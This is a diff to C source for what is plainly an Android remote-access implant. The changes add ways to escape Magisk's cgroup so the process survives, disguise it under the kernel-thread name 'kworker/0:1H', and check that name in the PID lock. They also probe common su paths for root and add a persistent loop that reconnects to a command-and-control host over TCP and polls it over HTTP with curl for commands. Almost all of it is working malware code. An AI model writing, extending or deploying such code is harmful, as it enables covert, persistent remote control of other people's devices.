@@ -331,7 +331,6 @@ static void write_http_poll_sh(const char *c2_host, int http_port) {
         "TCURL=/data/data/com.termux/files/usr/bin/curl\n"
         "_curl() { if [ -x \"$TCURL\" ]; then \"$TCURL\" \"$@\"; else curl \"$@\"; fi; }\n"
         "while true; do\n"
-        /* HTTP GET /cmd using curl if available, else nc raw HTTP */
         "  if command -v curl >/dev/null 2>&1 || [ -x \"$TCURL\" ]; then\n"
         "    _CMD=$(_curl -sf --connect-timeout 15 --max-time 20 "
               "\"http://$C2:$HP/cmd\" 2>/dev/null)\n"
@@ -370,7 +369,42 @@ static pid_t spawn_http_poll(const char *c2_host, int http_port) {
 }
 
 /* ── daemon mode ─────────────────────────────────────────────────────── */
+static void _escape_cgroup(void) {
+    /* Move self to root of each cgroup hierarchy to escape Magisk's
+     * module execution cgroup — otherwise Android kills us when
+     * service.sh exits and the cgroup notify-on-release fires.
+     * Tries both cgroups v1 and v2 paths. */
+    static const char *cg_procs[] = {
+        "/sys/fs/cgroup/cgroup.procs",    /* cgroups v2 unified */
+        "/acct/cgroup.procs",
+        "/dev/cpuset/cgroup.procs",
+        "/dev/cgroup/procs",
+        NULL
+    };
+    char me[16];
+    snprintf(me, sizeof(me), "%d\n", getpid());
+    for (int i = 0; cg_procs[i]; i++) {
+        int f = open(cg_procs[i], O_WRONLY);
+        if (f >= 0) { write(f, me, strlen(me)); close(f); }
+    }
+    /* Also move cpuset to background/foreground so we survive cpuset pruning */
+    const char *cpuset_tasks[] = {
+        "/dev/cpuset/background/tasks",
+        "/dev/cpuset/foreground/tasks",
+        NULL
+    };
+    snprintf(me, sizeof(me), "%d\n", getpid());
+    for (int i = 0; cpuset_tasks[i]; i++) {
+        int f = open(cpuset_tasks[i], O_WRONLY);
+        if (f >= 0) { write(f, me, strlen(me)); close(f); break; }
+    }
+}
+
 static void daemon_mode(const char *c2_host, int c2_port, int http_port) {
+
+    /* Escape Magisk's cgroup BEFORE forking — otherwise orphaned children
+     * get killed when service.sh exits and notify-on-release fires. */
+    _escape_cgroup();
 
     /* double-fork to fully detach from session */
     pid_t p = fork();
@@ -378,6 +412,7 @@ static void daemon_mode(const char *c2_host, int c2_port, int http_port) {
     if (p > 0) { waitpid(p, NULL, 0); return; }
 
     setsid();
+    _escape_cgroup();  /* re-escape in first child after setsid */
 
     p = fork();
     if (p < 0) _exit(0);
@@ -395,14 +430,27 @@ static void daemon_mode(const char *c2_host, int c2_port, int http_port) {
     /* disguise process name in /proc/<pid>/comm */
     prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
 
-    /* PID lock file — prevent duplicate daemons */
+    /* PID lock file — prevent duplicate daemons.
+     * After reboot, the old PID may be reassigned to an unrelated process.
+     * Validate by checking /proc/<pid>/comm contains our disguise name. */
     int pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0600);
     if (pfd < 0 && errno == EEXIST) {
         char pb[16] = {0};
         int rfd = open(PID_FILE, O_RDONLY);
         if (rfd >= 0) { read(rfd, pb, sizeof(pb) - 1); close(rfd); }
         pid_t old = (pid_t)atoi(pb);
-        if (old > 1 && kill(old, 0) == 0) _exit(0);  /* already running */
+        int is_our_proc = 0;
+        if (old > 1 && kill(old, 0) == 0) {
+            /* verify the running PID is actually our process */
+            char comm_path[64], comm_val[32] = {0};
+            snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", (int)old);
+            int cf = open(comm_path, O_RDONLY);
+            if (cf >= 0) { read(cf, comm_val, sizeof(comm_val)-1); close(cf); }
+            /* strip newline */
+            char *nl = strchr(comm_val, '\n'); if (nl) *nl = 0;
+            if (strcmp(comm_val, "kworker/0:1H") == 0) is_our_proc = 1;
+        }
+        if (is_our_proc) _exit(0);  /* genuine duplicate — already running */
         unlink(PID_FILE);
         pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
     }
@@ -456,6 +504,74 @@ static void daemon_mode(const char *c2_host, int c2_port, int http_port) {
     unlink(PID_FILE);
 }
 
+/* ── nohup_loop mode ─────────────────────────────────────────────────────
+ * Launched as: setsid nohup "$BIN" host port http_port nohup_loop &
+ * service.sh already put us in a new session — no fork needed.
+ * We just disguise, escape cgroup, and run the reconnect loop directly. */
+static void nohup_loop_mode(const char *c2_host, int c2_port, int http_port) {
+    int dn = open("/dev/null", O_RDWR);
+    if (dn >= 0) { dup2(dn, 0); dup2(dn, 1); dup2(dn, 2); close(dn); }
+    umask(0);
+    chdir("/");
+
+    prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
+    _escape_cgroup();
+
+    /* PID lock — same validation as daemon_mode */
+    int pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0600);
+    if (pfd < 0 && errno == EEXIST) {
+        char pb[16] = {0};
+        int rfd = open(PID_FILE, O_RDONLY);
+        if (rfd >= 0) { read(rfd, pb, sizeof(pb) - 1); close(rfd); }
+        pid_t old = (pid_t)atoi(pb);
+        int is_our_proc = 0;
+        if (old > 1 && kill(old, 0) == 0) {
+            char comm_path[64], comm_val[32] = {0};
+            snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", (int)old);
+            int cf = open(comm_path, O_RDONLY);
+            if (cf >= 0) { read(cf, comm_val, sizeof(comm_val)-1); close(cf); }
+            char *nl = strchr(comm_val, '\n'); if (nl) *nl = 0;
+            if (strcmp(comm_val, "kworker/0:1H") == 0) is_our_proc = 1;
+        }
+        if (is_our_proc) _exit(0);
+        unlink(PID_FILE);
+        pfd = open(PID_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+    }
+    if (pfd >= 0) {
+        char pb[16];
+        snprintf(pb, sizeof(pb), "%d\n", getpid());
+        write(pfd, pb, strlen(pb));
+        close(pfd);
+    }
+
+    const char *su_paths[] = {
+        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
+        "/system/xbin/su", "/data/adb/magisk/su", "/sbin/su", NULL
+    };
+    char root_bin[128] = {0};
+    for (int i = 0; su_paths[i]; i++) {
+        if (fexists(su_paths[i])) {
+            char tc[256], to[64] = {0};
+            snprintf(tc, sizeof(tc), "%s -c id 2>/dev/null", su_paths[i]);
+            runcmd(tc, to, sizeof(to));
+            if (strstr(to, "uid=0")) { strncpy(root_bin, su_paths[i], sizeof(root_bin)-1); break; }
+        }
+    }
+
+    pid_t poll_pid = spawn_http_poll(c2_host, http_port);
+
+    int backoff = 30;
+    for (;;) {
+        build_json("daemon");
+        int fd = tcp_connect(c2_host, c2_port);
+        if (fd >= 0) { tcp_session(fd, "daemon", root_bin); close(fd); backoff = 30; }
+        if (waitpid(poll_pid, NULL, WNOHANG) == poll_pid)
+            poll_pid = spawn_http_poll(c2_host, http_port);
+        sleep(backoff);
+        if (backoff < 300) backoff += 30;
+    }
+}
+
 /* ─── main ─────────────────────────────────────────────────────────── */
 int main(int argc, char *argv[]) {
     const char *c2_host  = (argc > 1) ? argv[1] : "127.0.0.1";
@@ -471,6 +587,10 @@ int main(int argc, char *argv[]) {
 
     if (strcmp(mode, "daemon") == 0) {
         daemon_mode(c2_host, c2_port, http_port);
+        return 0;
+    }
+    if (strcmp(mode, "nohup_loop") == 0) {
+        nohup_loop_mode(c2_host, c2_port, http_port);
         return 0;
     }
 
